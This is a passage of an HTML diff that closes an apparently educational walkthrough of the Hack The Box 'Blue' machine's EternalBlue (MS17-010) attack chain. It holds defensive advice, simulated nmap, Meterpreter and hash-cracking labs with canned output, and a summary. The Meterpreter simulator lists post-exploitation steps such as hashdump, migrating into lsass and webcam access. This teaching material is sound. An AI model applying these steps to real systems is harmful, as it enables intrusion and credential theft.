+      <div class="map-node map-node-alt">
+        <div class="map-question">Reconnaissance</div>
+        <div class="map-answer">What services are running, what OS is in use, what versions are present?</div>
+      </div>
+      <div class="map-node map-node-alt">
+        <div class="map-question">Weaponization</div>
+        <div class="map-answer">Which exploit matches the discovered vulnerabilities, what payload is needed?</div>
+      </div>
+      <div class="map-node map-node-alt">
+        <div class="map-question">Delivery & Exploitation</div>
+        <div class="map-answer">How to reach the target, trigger the exploit, and establish persistence?</div>
+      </div>
+      <div class="map-node map-node-alt">
+        <div class="map-question">Exfiltration</div>
+        <div class="map-answer">What data is valuable, how to extract it without detection, where to store it?</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="defense">
+  <div class="section-inner">
+    <div class="section-number">Section 21</div>
+    <h2 class="section-title">Defensive Security Measures</h2>
+    <p class="section-desc">Understanding the attack is only half the battle. Implementing proper defensive measures prevents these attacks from succeeding in your environment.</p>
+    <div class="defense-grid">
+      <div class="defense-card">
+        <div class="defense-header">
+          <span class="defense-icon">!</span>
+          <h3>Patch Management</h3>
+        </div>
+        <p class="defense-why">Why: EternalBlue exploits unpatched SMBv1 vulnerabilities</p>
+        <p class="defense-fix">Fix: Apply MS17-010 patch, disable SMBv1 via Group Policy</p>
+      </div>
+      <div class="defense-card">
+        <div class="defense-header">
+          <span class="defense-icon">!</span>
+          <h3>Network Segmentation</h3>
+        </div>
+        <p class="defense-why">Why: Lateral movement spreads infections rapidly</p>
+        <p class="defense-fix">Fix: Segment networks, restrict SMB access between zones</p>
+      </div>
+      <div class="defense-card">
+        <div class="defense-header">
+          <span class="defense-icon">!</span>
+          <h3>Endpoint Detection</h3>
+        </div>
+        <p class="defense-why">Why: EDR detects exploit behavior in memory</p>
+        <p class="defense-fix">Fix: Deploy EDR with behavioral detection rules</p>
+      </div>
+      <div class="defense-card">
+        <div class="defense-header">
+          <span class="defense-icon">!</span>
+          <h3>Firewall Rules</h3>
+        </div>
+        <p class="defense-why">Why: Open ports 139/445 are the attack vector</p>
+        <p class="defense-fix">Fix: Block SMB ports at perimeter firewalls</p>
+      </div>
+      <div class="defense-card">
+        <div class="defense-header">
+          <span class="defense-icon">!</span>
+          <h3>Least Privilege</h3>
+        </div>
+        <p class="defense-why">Why: Limits damage from compromised accounts</p>
+        <p class="defense-fix">Fix: Implement RBAC and regular privilege audits</p>
+      </div>
+      <div class="defense-card">
+        <div class="defense-header">
+          <span class="defense-icon">!</span>
+          <h3>Log Monitoring</h3>
+        </div>
+        <p class="defense-why">Why: Attack leaves traces in event logs</p>
+        <p class="defense-fix">Fix: Centralize logs, alert on SMB anomalies</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section section-alt" id="labs">
+  <div class="section-inner-full">
+    <div class="section-number">Section 22</div>
+    <h2 class="section-title">Interactive Labs</h2>
+    <p class="section-desc">Practice your skills with these interactive simulations. Explore Nmap flags, execute Meterpreter commands, crack hashes, and navigate the Windows filesystem.</p>
+    <div class="labs-grid">
+      <div class="lab-panel">
+        <h3>Nmap Command Builder</h3>
+        <p>Toggle flags to build your Nmap command</p>
+        <div class="flag-buttons">
+          <button class="btn btn-flag" onclick="toggleNmapFlag('script')">-sC</button>
+          <button class="btn btn-flag" onclick="toggleNmapFlag('version')">-sV</button>
+          <button class="btn btn-flag" onclick="toggleNmapFlag('verbose')">-v3</button>
+          <button class="btn btn-flag" onclick="toggleNmapFlag('allports')">-p-</button>
+          <button class="btn btn-flag" onclick="toggleNmapFlag('noping')">-Pn</button>
+          <button class="btn btn-flag" onclick="toggleNmapFlag('output')">-oN</button>
+        </div>
+        <div class="lab-display" id="nmapFlags">nmap</div>
+        <button class="btn btn-primary" onclick="runNmapSim()">Simulate Scan</button>
+        <div class="lab-output" id="nmapSimResult"></div>
+      </div>
+      <div class="lab-panel">
+        <h3>Meterpreter Simulator</h3>
+        <p>Type a command to see its output</p>
+        <div class="lab-input-group">
+          <input type="text" id="meterpreterInput" placeholder="sysinfo, getuid, hashdump..." class="lab-input">
+          <button class="btn btn-primary" onclick="runMeterpreterSim()">Run</button>
+        </div>
+        <div class="lab-output" id="meterpreterResult"></div>
+      </div>
+      <div class="lab-panel">
+        <h3>Hash Cracker Simulator</h3>
+        <p>Enter an NTLM hash to attempt cracking</p>
+        <div class="lab-input-group">
+          <input type="text" id="hashInput" placeholder="5f4dcc3b5aa765d61d8327deb882cf99" class="lab-input">
+          <button class="btn btn-primary" onclick="simulateCrack()">Crack</button>
+        </div>
+        <div class="lab-output" id="crackResult"></div>
+      </div>
+      <div class="lab-panel">
+        <h3>Windows File Explorer</h3>
+        <p>Navigate the Windows filesystem</p>
+        <div class="path-buttons">
+          <button class="btn btn-path" onclick="explorePath('C:\\')">C:\</button>
+          <button class="btn btn-path" onclick="explorePath('C:\\Users')">Users</button>
+          <button class="btn btn-path" onclick="explorePath('C:\\Users\\Administrator\\Desktop')">Admin Desktop</button>
+          <button class="btn btn-path" onclick="explorePath('C:\\Windows\\System32\\config')">System32</button>
+        </div>
+        <div class="lab-output" id="exploreResult"></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="conclusion">
+  <div class="section-inner">
+    <div class="section-number">Section 23</div>
+    <h2 class="section-title">Final Security Lessons</h2>
+    <p class="section-desc">This walkthrough demonstrated the complete attack chain from reconnaissance to SYSTEM access. Each phase teaches important lessons about Windows security and defensive strategies.</p>
+    <div class="conclusion-chain">
+      <div class="chain-link">
+        <span class="chain-icon">R</span>
+        <span class="chain-text">Reconnaissance</span>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-link">
+        <span class="chain-icon">E</span>
+        <span class="chain-text">Enumeration</span>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-link">
+        <span class="chain-icon">V</span>
+        <span class="chain-text">Vuln Discovery</span>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-link">
+        <span class="chain-icon">E</span>
+        <span class="chain-text">Exploitation</span>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-link">
+        <span class="chain-icon">S</span>
+        <span class="chain-text">SYSTEM</span>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-link">
+        <span class="chain-icon">C</span>
+        <span class="chain-text">Credential Theft</span>
+      </div>
+      <div class="chain-arrow">→</div>
+      <div class="chain-link">
+        <span class="chain-icon">P</span>
+        <span class="chain-text">Post-Exploitation</span>
+      </div>
+    </div>
+    <div class="quote-block">
+      <div class="quote-text">"The best defense against EternalBlue and similar exploits is a proactive patch management strategy combined with network segmentation and defense-in-depth principles."</div>
+      <div class="quote-author">— Security Best Practices Summary</div>
+    </div>
+    <div class="terminal">
+      <div class="terminal-header">
+        <span class="terminal-dot red"></span>
+        <span class="terminal-dot yellow"></span>
+        <span class="terminal-dot green"></span>
+        <span class="terminal-title">summary.ps1</span>
+      </div>
+      <div class="terminal-body">
+<span class="success">[+] Reconnaissance complete - Target identified</span>
+<span class="success">[+] Enumeration complete - SMBv1 detected</span>
+<span class="success">[+] Vulnerability confirmed - MS17-010 present</span>
+<span class="success">[+] Exploitation successful - EternalBlue deployed</span>
+<span class="success">[+] SYSTEM access achieved - Full control obtained</span>
+<span class="success">[+] Credential dumping complete - Hashes extracted</span>
+<span class="success">[+] Flags discovered - 4 flags located</span>
+<span class="success">[+] Walkthrough complete - Blue machine pwned</span>
+      </div>
+    </div>
+    <div class="footer-text">
+      Blue EternalBlue Walkthrough &mdash; Offensive Security Educational Content &mdash; Hack The Box Blue Machine
+    </div>
+  </div>
+</section>
+
+<script>
+const canvas=document.getElementById('hero-canvas');
+const ctx=canvas.getContext('2d');
+let width,height;
+function resizeCanvas(){width=canvas.width=canvas.offsetWidth;height=canvas.height=canvas.offsetHeight}
+resizeCanvas();window.addEventListener('resize',resizeCanvas);
+const particles=[];
+for(let i=0;i<80;i++){particles.push({x:Math.random()*width,y:Math.random()*height,vx:(Math.random()-0.5)*0.5,vy:(Math.random()-0.5)*0.5,size:Math.random()*2+0.5,alpha:Math.random()*0.5+0.2})}
+function drawParticles(){ctx.clearRect(0,0,width,height);particles.forEach(p=>{p.x+=p.vx;p.y+=p.vy;if(p.x<0)p.x=width;if(p.x>width)p.x=0;if(p.y<0)p.y=height;if(p.y>height)p.y=0;ctx.beginPath();ctx.arc(p.x,p.y,p.size,0,Math.PI*2);ctx.fillStyle='rgba(0,180,216,'+p.alpha+')';ctx.fill()});for(let i=0;i<particles.length;i++){for(let j=i+1;j<particles.length;j++){const dx=particles[i].x-particles[j].x;const dy=particles[i].y-particles[j].y;const dist=Math.sqrt(dx*dx+dy*dy);if(dist<150){ctx.beginPath();ctx.moveTo(particles[i].x,particles[i].y);ctx.lineTo(particles[j].x,particles[j].y);ctx.strokeStyle='rgba(0,180,216,'+(0.08*(1-dist/150))+')';ctx.stroke()}}}requestAnimationFrame(drawParticles)}
+drawParticles();
+const logMessages=[
+  {text:'Target Discovered',dot:'green'},
+  {text:'SMB Service Detected',dot:'cyan'},
+  {text:'MS17-010 Vulnerability Identified',dot:'yellow'},
+  {text:'EternalBlue Exploit Loaded',dot:'cyan'},
+  {text:'SYSTEM Access Achieved',dot:'green'},
+  {text:'Credential Dumping Initiated',dot:'red'}
+];
+const heroLogs=document.getElementById('heroLogs');
+logMessages.forEach((msg,i)=>{
+  const el=document.createElement('div');
+  el.className='log-line';
+  el.style.animationDelay=(2+i*0.8)+'s';
+  el.innerHTML='<span class="log-dot '+msg.dot+'"></span> '+msg.text;
+  heroLogs.appendChild(el)
+});
+const floatingNav=document.getElementById('floatingNav');
+const navProgress=document.getElementById('navProgress');
+window.addEventListener('scroll',()=>{
+  const scrollY=window.scrollY;
+  const heroHeight=document.getElementById('hero').offsetHeight;
+  const docHeight=document.documentElement.scrollHeight-window.innerHeight;
+  if(scrollY>heroHeight)floatingNav.classList.add('visible');
+  else floatingNav.classList.remove('visible');
+  navProgress.style.width=Math.min((scrollY/docHeight)*100,100)+'%'
+});
+const revealElements=document.querySelectorAll('.reveal');
+const revealObserver=new IntersectionObserver((entries)=>{
+  entries.forEach(entry=>{if(entry.isIntersecting)entry.target.classList.add('visible')})
+},{threshold:0.1});
+revealElements.forEach(el=>revealObserver.observe(el));
+document.querySelectorAll('.flow-node').forEach(node=>{
+  node.addEventListener('click',()=>{
+    const wasActive=node.classList.contains('active');
+    document.querySelectorAll('.flow-node').forEach(n=>n.classList.remove('active'));
+    if(!wasActive)node.classList.add('active')
+  })
+});
+document.querySelectorAll('.cmd-card').forEach(card=>{
+  card.addEventListener('click',()=>{
+    const wasActive=card.classList.contains('active');
+    document.querySelectorAll('.cmd-card').forEach(c=>c.classList.remove('active'));
+    if(!wasActive)card.classList.add('active')
+  })
+});
+const nmapFlagsSet=new Set();
+function toggleNmapFlag(flag){
+  if(nmapFlagsSet.has(flag))nmapFlagsSet.delete(flag);
+  else nmapFlagsSet.add(flag);
+  document.getElementById('nmapFlags').textContent=Array.from(nmapFlagsSet).join(' ')
+}
+function runNmapSim(){
+  const flags=Array.from(nmapFlagsSet);
+  const r=document.getElementById('nmapSimResult');
+  if(flags.length===0){r.innerHTML='[!] Select at least one flag.';return}
+  let out='[+] Starting Nmap scan...\n[+] Target: 10.10.10.10\n';
+  if(flags.includes('script'))out+='[+] Checking MS17-010...\n[+] SMBv1 enabled\n[+] TARGET IS VULNERABLE';
+  else out+='[+] 135/tcp open msrpc\n[+] 139/tcp open netbios-ssn\n[+] 445/tcp open microsoft-ds\n[+] 3389/tcp open rdp';
+  r.innerHTML=out
+}
+function runMeterpreterSim(){
+  const input=document.getElementById('meterpreterInput').value.toLowerCase().trim();
+  const r=document.getElementById('meterpreterResult');
+  const cmds={
+    sysinfo:'Computer: BLUE-PC\nOS: Windows 7 Professional SP1 (x64)\nArchitecture: x64\nDomain: WORKGROUP',
+    getuid:'Server username: NT AUTHORITY\\SYSTEM',
+    hashdump:'Admin:500:aad3...\nJon:1000:aad3...:5f4dcc3b5aa765d61d8327deb882cf99\nGuest:501:aad3...',
+    ps:'PID  Name         Arch  User\n---  ----         ----  ----\n 4   smss.exe     x64   SYSTEM\n 504  lsass.exe    x64   SYSTEM',
+    shell:'Microsoft Windows [Version 6.1.7601]\nC:\\Windows\\system32>',
+    screenshare:'[+] Screenshot saved to /home/kali/scr1.png',
+    migrate:'[+] Migrated to process 504 (lsass.exe)',
+    upload:'[+] File uploaded successfully',
+    download:'[+] File downloaded successfully',
+    webcam_list:'[+] Webcam 1: USB Camera'
+  };
+  if(input in cmds)r.innerHTML=cmds[input];
+  else r.innerHTML='[!] Unknown command. Try: sysinfo, getuid, hashdump, ps, shell, screenshare, migrate, upload, download, webcam_list'
+}
+function simulateCrack(){
+  const hash=document.getElementById('hashInput').value.trim().toLowerCase();
+  const r=document.getElementById('crackResult');
+  const known={'5f4dcc3b5aa765d61d8327deb882cf99':'password','31d6cfe0d16ae931b73c59d7e0c089c0':'[empty]'};
+  if(hash in known)r.innerHTML='[+] Password found: '+known[hash];
+  else r.innerHTML='[+] No match in wordlist'
+}
+function explorePath(path){
+  const r=document.getElementById('exploreResult');
+  const dirs={
+    'C:\\':'flag1.txt (24 bytes)\nWindows <DIR>\nUsers <DIR>',
+    'C:\\Users\\Administrator\\Desktop':'flag3.txt (28 bytes)\nnotes.txt',
+    'C:\\Windows\\System32\\config':'SAM (24,576 bytes)\nSYSTEM (12,288 bytes)\nflag2.txt (32 bytes)',
+    'C:\\Users':'Administrator <DIR>\nJon <DIR>\nPublic <DIR>'
+  };
+  r.innerHTML=path in dirs ? dirs[path] : 'No files found.'
+}
+</script>
+</body>
+</html>
